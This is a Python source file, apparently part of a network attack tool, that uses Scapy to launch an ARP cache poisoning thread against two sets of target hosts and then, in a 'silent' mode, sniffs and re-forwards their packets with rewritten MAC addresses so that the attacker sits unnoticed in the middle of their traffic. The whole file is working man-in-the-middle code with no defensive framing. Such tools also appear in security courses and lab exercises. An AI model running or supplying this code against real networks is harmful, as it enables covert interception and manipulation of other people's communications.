from scapy.all import *
from poisoning import poisoning
import threading


class dnsarp():

    def __init__(self, interface):
        self.interface = interface

    def startProcess(self):
        #Now we will create and send the arp packets which will poison the caches.
        proc_thread = None
        process = poisoning(self.interface, self.target, self.target2, self.ownMAC, self.direction)
        proc_thread = threading.Thread(target=process.poisoning)
        proc_thread.daemon = True
        proc_thread.start()
        #now we will redirect packets correctly -> do not enable port forwarding on your device
        if(self.mode == "silent"):
            while True:
                sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)

    def packetForwarding(self, packet):
        #first we should check whether the packet satisfies the most basic requirement of having the IP + ether layer
        if(self.mode == "silent"):
            if packet.haslayer(Ether) and packet.haslayer(IP):
                sender = None
                senderfound = False
                receiver = None
                receiverfound = False
                #Finds the sender to be in target or target2 set
                for tar1 in self.target:
                    if(tar1["mac"] == packet[Ether].src):
                        sender = tar1
                        senderfound = True
                        for tar2 in self.target2:
                            if(tar2["ip"] == packet[IP].dst):
                                receiver = tar2
                                receiverfound = True
                if((not senderfound) or (not receiverfound)):
                    for tar2 in self.target2:
                        if(tar2["mac"] == packet[Ether].src):
                            sender = tar2
                            senderfound = True
                            for tar1 in self.target:
                                if(tar1["ip"] == packet[IP].dst):
                                    receiver = tar1
                                    receiverfound = True
                #now we will modify the packet and forward it
                if (senderfound and receiverfound):
                    packet[Ether].src = self.ownMAC
                    packet[Ether].dst = receiver["mac"]
                    sendp(packet, iface=self.interface, verbose=False)
            

    def setInput(self, ip_range, ips_used, target, target2, ownMAC, direction, mode):
        self.ip_range = ip_range
        self.ips_used = ips_used
        self.target = target
        self.target2 = target2
        self.ownMAC = ownMAC
        self.direction = direction
        self.mode = mode

        
